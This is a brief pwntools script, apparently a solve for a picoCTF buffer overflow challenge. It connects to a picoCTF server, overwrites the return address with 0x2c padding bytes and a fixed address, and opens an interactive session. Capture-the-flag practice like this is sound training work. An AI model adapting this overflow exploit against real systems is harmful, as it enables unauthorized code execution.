from pwn import *

r = remote("saturn.picoctf.net", 57321)
# r = process("./vuln")

r.recvline()

# raw_input()
payload = b'a'*0x2c + p32(0x80491f6)
r.sendline(payload)

r.interactive()